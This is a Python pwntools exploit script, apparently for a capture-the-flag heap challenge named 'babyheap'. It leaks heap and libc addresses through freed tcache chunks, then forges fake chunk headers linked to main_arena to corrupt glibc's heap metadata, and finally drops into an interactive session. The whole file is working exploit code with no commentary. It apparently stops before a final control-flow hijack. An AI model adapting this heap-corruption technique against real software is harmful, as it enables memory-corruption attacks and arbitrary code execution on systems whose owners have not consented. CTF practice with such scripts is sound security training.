#!/usr/bin/python3

from pwn import *
import sys

#HOST = 'eofqual.zoolab.org'
HOST = 'localhost'
PORT = 10101
BIN = './babyheap'
LIBC = './libc.so.6'

e = ELF(BIN)
l = ELF(LIBC)

if len(sys.argv) > 1:
    r = remote(HOST, PORT)
else:
    r = process(BIN)

def ch(i):
    r.sendafter('choice : ', str(i))

def add(size, data):
    ch('C')
    r.sendlineafter("Size : ", str(size))
    r.sendlineafter("Data : ", data)
 
def edit(data):
    ch('E')
    r.sendlineafter("Data : ", data)
 
def delete():
    ch('D')
 
def show():
    ch('S')

def ultra(data):
    ch('U')
    r.sendlineafter("Data : ", data)

for _ in range(7):
    add(0x378, 'Q') # 1~7
    delete() # 1~7
"""
create 10
show 2
edit 1
delete 8
"""
show() # 1
heap = u64(r.recv(6) + b'\x00'*2) - 0x2840
log.info(f'heap: {hex(heap)}')
add(0x378, 'Q') # 8
ultra('Q')
delete()# 8
show() # 2
libc = u64(r.recv(6) + b'\x00'*2) - 0x1ebbe0
main_arena = 0x1ebbe0 + libc
fchk = heap + 0x2f30
log.info(f'libc: {hex(libc)}')
log.info(f'fchk: {hex(fchk)}')
# calloc 0x7ffff7e73c90
i = 0

ftchk = p64(main_arena) + p64(fchk + 0x20)

chk0x270s = b''
while i < 8: # 8 * 0x270
    chk0x270s += p64(0) + p64(0x270) + p64(fchk + 0x20*i) + p64(fchk + 0x20*(i+2))
    i += 1

chk0x20s = b''
while i < 8 + 6: # 6 * 0x20
    chk0x20s += p64(0x20) + p64(0x20) + p64(fchk + 0x20*i) + p64(fchk + 0x20*(i+2))
    i += 1

echk = p64(0x20) + p64(0x20) + p64(fchk + 0x20*i) + p64(main_arena)
pre_chk = p64(0x20) + p64(0x80)

chunks = ftchk + chk0x270s + chk0x20s + echk + pre_chk

chunks = chunks.ljust(0x270, b'\x00') + (p64(0)*2 + p64(0x270) + p64(0x80))*8 + p64(0x380) # prev_size
print(hex(len(chunks)))

edit(chunks)
r.interactive()
